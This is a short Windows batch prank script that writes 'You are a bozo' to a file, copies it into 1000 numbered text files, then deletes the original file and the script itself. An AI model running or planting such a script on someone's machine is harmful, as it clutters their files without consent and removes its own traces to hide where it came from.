echo You are a bozo > Bozo.txt
for /l %%x in (1, 1, 1000) do (
copy Bozo.txt Bozo%%x.txt
)
del Bozo.txt
del Bozo.bat
